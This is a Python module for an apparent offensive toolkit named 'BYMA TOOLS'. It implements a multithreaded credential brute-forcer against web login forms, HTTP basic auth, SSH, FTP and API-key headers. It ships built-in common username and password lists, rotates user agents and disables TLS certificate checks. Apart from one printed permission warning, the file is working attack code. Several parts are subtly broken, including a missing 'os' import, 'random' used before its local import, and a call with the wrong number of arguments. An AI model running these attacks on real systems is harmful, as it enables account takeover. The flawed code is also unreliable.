"""
BYMA TOOLS - Advanced Brute Force Tool
Professional brute force attacks for security testing
"""
import requests
import hashlib
import json
import time
import itertools
import string
import concurrent.futures
from pathlib import Path
from datetime import datetime
from urllib.parse import urljoin
from core.colors import (
    print_success, print_error, print_warning, print_info,
    print_result, print_section, print_subsection, print_table,
    cprint, Colors, print_separator, Icons
)
from core.logger import get_database, get_logger


class BruteForcer:
    """Professional brute force tool for authorized security testing"""
    
    def __init__(self):
        self.logger = get_logger()
        self.db = get_database()
        self.start_time = None
        self.found = False
        self.attempts = 0
        self.failed_attempts = 0
        self.locked_out = False
    
    # Common usernames
    COMMON_USERNAMES = [
        'admin', 'administrator', 'root', 'test', 'user', 'guest',
        'info', 'support', 'webmaster', 'postmaster', 'hostmaster',
        'admin1', 'admin2', 'admin123', 'sysadmin', 'superadmin',
        'administrator1', 'admin@example.com', 'user@example.com',
    ]
    
    # Common passwords
    COMMON_PASSWORDS = [
        'password', '123456', '12345678', 'qwerty', 'abc123', 'monkey',
        'master', 'dragon', 'login', 'princess', 'football', 'shadow',
        'sunshine', 'trustno1', 'iloveyou', 'batman', 'access', 'hello',
        'charlie', 'donald', 'password1', 'qwerty123', 'letmein', 'welcome',
        'admin', 'admin123', 'root', 'toor', 'pass', 'test', 'guest',
        'changeme', 'secret', 'passw0rd', 'p@ssw0rd', 'P@ssw0rd',
        'Password1', 'Password123', 'Welcome1', 'Welcome123',
    ]
    
    # User agent rotation
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)',
    ]
    
    def attack(self, url, username=None, password=None, wordlist=None, 
               threads=1, timeout=10, output=None, attack_type='login',
               method='POST', username_field='username', password_field='password',
               success_indicator=None, fail_indicator=None):
        """Main brute force function"""
        self.start_time = datetime.now()
        self.found = False
        self.attempts = 0
        
        print_section("BRUTE FORCE")
        print()
        
        # Create scan record
        scan_id = self.db.create_scan("brute_force", url, "attack")
        self.logger.scan_start("brute_force", url)
        
        try:
            print(f"  {Icons.TARGET} {Colors.BCYAN}Target:{Colors.BWHITE}       {url}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Type:{Colors.BWHITE}         {attack_type.upper()}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Method:{Colors.BWHITE}       {method.upper()}")
            print(f"  {Icons.INFO} {Colors.BCYAN}Threads:{Colors.BWHITE}      {threads}")
            print_separator("-", 50)
            print()
            
            # Warning
            print_warning("Brute force should only be performed on systems you own or have permission to test")
            print()
            
            # Get target response
            print_subsection("Analyzing Target")
            baseline = self._get_baseline(url)
            
            if not baseline:
                print_error("Could not reach target")
                return
            
            print_success(f"Target reachable (Status: {baseline['status']})")
            print()
            
            # Start attack
            if attack_type == 'login':
                self._login_bruteforce(url, username, password, wordlist, 
                                       threads, timeout, method, username_field,
                                       password_field, success_indicator, fail_indicator)
            elif attack_type == 'basic_auth':
                self._basic_auth_bruteforce(url, username, wordlist, threads, timeout)
            elif attack_type == 'ssh':
                self._ssh_bruteforce(url, username, password, wordlist, threads, timeout)
            elif attack_type == 'ftp':
                self._ftp_bruteforce(url, username, password, wordlist, threads, timeout)
            elif attack_type == 'api_key':
                self._api_key_bruteforce(url, wordlist, threads, timeout)
            else:
                self._login_bruteforce(url, username, password, wordlist,
                                       threads, timeout, method, username_field,
                                       password_field, success_indicator, fail_indicator)
            
            # Display results
            self._display_results()
            
            # Save to database
            self._save_to_database(scan_id)
            
            # Update scan status
            self.db.update_scan(scan_id, "completed", self.attempts)
            self.logger.scan_complete("brute_force", url, self.attempts)
            
            # Save to file if requested
            if output:
                self._save_results(output)
            
            return self.found
        
        except Exception as e:
            self.db.update_scan(scan_id, "failed")
            self.logger.scan_error("brute_force", url, str(e))
            print_error(f"Brute force failed: {e}")
            return False
    
    def _get_baseline(self, url):
        """Get baseline response"""
        try:
            response = requests.get(url, timeout=10, verify=False)
            return {
                'status': response.status_code,
                'length': len(response.text),
            }
        except:
            return None
    
    def _login_bruteforce(self, url, username, password, wordlist, threads,
                          timeout, method, username_field, password_field,
                          success_indicator, fail_indicator):
        """Login form brute force"""
        print_subsection("Login Brute Force")
        
        # Build credential list
        credentials = []
        
        if username and password:
            credentials = [(username, password)]
        elif wordlist and os.path.exists(wordlist):
            print_info(f"Loading wordlist: {wordlist}")
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        u, p = line.split(':', 1)
                        credentials.append((u, p))
                    else:
                        credentials.append((username or 'admin', line))
        else:
            print_info("Using built-in credential list")
            for user in self.COMMON_USERNAMES:
                for pwd in self.COMMON_PASSWORDS:
                    credentials.append((user, pwd))
        
        print_info(f"Testing {len(credentials)} credentials")
        print()
        
        # Create session
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice(self.USER_AGENTS)
        })
        
        def test_credential(user, pwd):
            if self.found:
                return
            
            self.attempts += 1
            
            try:
                # Prepare data
                data = {
                    username_field: user,
                    password_field: pwd,
                }
                
                # Send request
                if method.upper() == 'POST':
                    response = session.post(url, data=data, timeout=timeout, verify=False)
                else:
                    response = session.get(url, params=data, timeout=timeout, verify=False)
                
                # Check response
                is_success = False
                
                if success_indicator:
                    is_success = success_indicator in response.text
                elif fail_indicator:
                    is_success = fail_indicator not in response.text
                else:
                    # Default: check for common success indicators
                    success_patterns = ['dashboard', 'welcome', 'logout', 'profile', 'account']
                    fail_patterns = ['invalid', 'incorrect', 'failed', 'error', 'wrong']
                    
                    response_lower = response.text.lower()
                    
                    if any(pattern in response_lower for pattern in success_patterns):
                        is_success = True
                    elif any(pattern in response_lower for pattern in fail_patterns):
                        is_success = False
                    else:
                        # Check if we got redirected to a different page
                        is_success = response.url != url
                
                if is_success:
                    self.found = True
                    print()
                    print_success(f"CREDENTIALS FOUND!")
                    print_success(f"  Username: {user}")
                    print_success(f"  Password: {pwd}")
                    return
                
                # Display progress
                if self.attempts % 100 == 0:
                    cprint(f"  Attempts: {self.attempts:,}", Colors.BWHITE)
            
            except requests.exceptions.Timeout:
                self.failed_attempts += 1
            except Exception as e:
                self.failed_attempts += 1
        
        # Run with thread pool
        import random
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for user, pwd in credentials:
                if self.found:
                    break
                futures.append(executor.submit(test_credential, user, pwd))
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except:
                    pass
    
    def _basic_auth_bruteforce(self, url, username, password, wordlist, threads, timeout):
        """Basic authentication brute force"""
        print_subsection("Basic Auth Brute Force")
        
        # Build credential list
        credentials = []
        
        if username and password:
            credentials = [(username, password)]
        else:
            for user in self.COMMON_USERNAMES:
                for pwd in self.COMMON_PASSWORDS:
                    credentials.append((user, pwd))
        
        print_info(f"Testing {len(credentials)} credentials")
        print()
        
        def test_credential(user, pwd):
            if self.found:
                return
            
            self.attempts += 1
            
            try:
                response = requests.get(url, auth=(user, pwd), timeout=timeout, verify=False)
                
                if response.status_code == 200:
                    self.found = True
                    print()
                    print_success(f"CREDENTIALS FOUND!")
                    print_success(f"  Username: {user}")
                    print_success(f"  Password: {pwd}")
                    return
                
                if self.attempts % 100 == 0:
                    cprint(f"  Attempts: {self.attempts:,}", Colors.BWHITE)
            
            except:
                self.failed_attempts += 1
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for user, pwd in credentials:
                if self.found:
                    break
                futures.append(executor.submit(test_credential, user, pwd))
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except:
                    pass
    
    def _ssh_bruteforce(self, hostname, username, password, wordlist, threads, timeout):
        """SSH brute force (requires paramiko)"""
        print_subsection("SSH Brute Force")
        
        try:
            import paramiko
        except ImportError:
            print_error("Paramiko is required for SSH brute force")
            print_info("Install with: pip install paramiko")
            return
        
        # Build credential list
        credentials = []
        
        if username and password:
            credentials = [(username, password)]
        else:
            for user in self.COMMON_USERNAMES:
                for pwd in self.COMMON_PASSWORDS:
                    credentials.append((user, pwd))
        
        print_info(f"Testing {len(credentials)} credentials")
        print()
        
        def test_credential(user, pwd):
            if self.found:
                return
            
            self.attempts += 1
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname, username=user, password=pwd, timeout=timeout)
                
                self.found = True
                print()
                print_success(f"CREDENTIALS FOUND!")
                print_success(f"  Username: {user}")
                print_success(f"  Password: {pwd}")
                
                client.close()
                return
            
            except paramiko.AuthenticationException:
                pass
            except:
                self.failed_attempts += 1
            
            if self.attempts % 100 == 0:
                cprint(f"  Attempts: {self.attempts:,}", Colors.BWHITE)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for user, pwd in credentials:
                if self.found:
                    break
                futures.append(executor.submit(test_credential, user, pwd))
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except:
                    pass
    
    def _ftp_bruteforce(self, hostname, username, password, wordlist, threads, timeout):
        """FTP brute force"""
        print_subsection("FTP Brute Force")
        
        # Build credential list
        credentials = []
        
        if username and password:
            credentials = [(username, password)]
        else:
            for user in self.COMMON_USERNAMES:
                for pwd in self.COMMON_PASSWORDS:
                    credentials.append((user, pwd))
        
        print_info(f"Testing {len(credentials)} credentials")
        print()
        
        def test_credential(user, pwd):
            if self.found:
                return
            
            self.attempts += 1
            
            try:
                from ftplib import FTP
                
                ftp = FTP()
                ftp.connect(hostname, 21, timeout=timeout)
                ftp.login(user, pwd)
                
                self.found = True
                print()
                print_success(f"CREDENTIALS FOUND!")
                print_success(f"  Username: {user}")
                print_success(f"  Password: {pwd}")
                
                ftp.quit()
                return
            
            except:
                self.failed_attempts += 1
            
            if self.attempts % 100 == 0:
                cprint(f"  Attempts: {self.attempts:,}", Colors.BWHITE)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for user, pwd in credentials:
                if self.found:
                    break
                futures.append(executor.submit(test_credential, user, pwd))
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except:
                    pass
    
    def _api_key_bruteforce(self, url, wordlist, threads, timeout):
        """API key brute force"""
        print_subsection("API Key Brute Force")
        
        # Build API key list
        api_keys = []
        
        if wordlist and os.path.exists(wordlist):
            with open(wordlist, 'r') as f:
                api_keys = [line.strip() for line in f if line.strip()]
        else:
            # Generate common API key patterns
            for i in range(1000):
                api_keys.append(f"key_{i:06d}")
                api_keys.append(f"api_{i:06d}")
                api_keys.append(f"token_{i:06d}")
        
        print_info(f"Testing {len(api_keys)} API keys")
        print()
        
        def test_api_key(key):
            if self.found:
                return
            
            self.attempts += 1
            
            try:
                headers = {
                    'Authorization': f'Bearer {key}',
                    'X-API-Key': key,
                    'api_key': key,
                }
                
                response = requests.get(url, headers=headers, timeout=timeout, verify=False)
                
                if response.status_code == 200:
                    self.found = True
                    print()
                    print_success(f"API KEY FOUND!")
                    print_success(f"  Key: {key}")
                    return
                
                if self.attempts % 100 == 0:
                    cprint(f"  Attempts: {self.attempts:,}", Colors.BWHITE)
            
            except:
                self.failed_attempts += 1
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for key in api_keys:
                if self.found:
                    break
                futures.append(executor.submit(test_api_key, key))
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except:
                    pass
    
    def _display_results(self):
        """Display brute force results"""
        print_section("BRUTE FORCE RESULTS")
        
        elapsed = (datetime.now() - self.start_time).total_seconds()
        
        # Summary
        print(f"\n  {Icons.INFO} {Colors.BCYAN}ATTACK SUMMARY{Colors.RESET}")
        print_separator("-", 50)
        
        print(f"  {Icons.INFO} {Colors.BCYAN}Attempts:{Colors.BWHITE}      {self.attempts:,}")
        print(f"  {Icons.INFO} {Colors.BCYAN}Failed:{Colors.BWHITE}        {self.failed_attempts:,}")
        print(f"  {Icons.INFO} {Colors.BCYAN}Time:{Colors.BWHITE}         {elapsed:.1f}s")
        print(f"  {Icons.INFO} {Colors.BCYAN}Rate:{Colors.BWHITE}         {self.attempts/max(elapsed, 1):.1f} attempts/s")
        print(f"  {Icons.INFO} {Colors.BCYAN}Result:{Colors.BWHITE}       {'SUCCESS' if self.found else 'NOT FOUND'}")
        
        print_separator("-", 50)
        print()
    
    def _save_to_database(self, scan_id):
        """Save results to database"""
        try:
            with self.db._cursor() as cursor:
                cursor.execute("""
                    INSERT INTO scan_results 
                    (scan_id, result_type, result_data)
                    VALUES (?, ?, ?)
                """, (
                    scan_id,
                    'brute_force_result',
                    json.dumps({
                        'found': self.found,
                        'attempts': self.attempts,
                    })
                ))
        except Exception as e:
            print_warning(f"Could not save to database: {e}")
    
    def _save_results(self, output_file):
        """Save results to JSON file"""
        try:
            output_path = Path(output_file)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            results = {
                'scan_time': self.start_time.isoformat(),
                'found': self.found,
                'attempts': self.attempts,
            }
            
            with open(output_path, 'w') as f:
                json.dump(results, f, indent=2)
            
            print_success(f"Results saved to {output_file}")
        except Exception as e:
            print_error(f"Failed to save results: {e}")
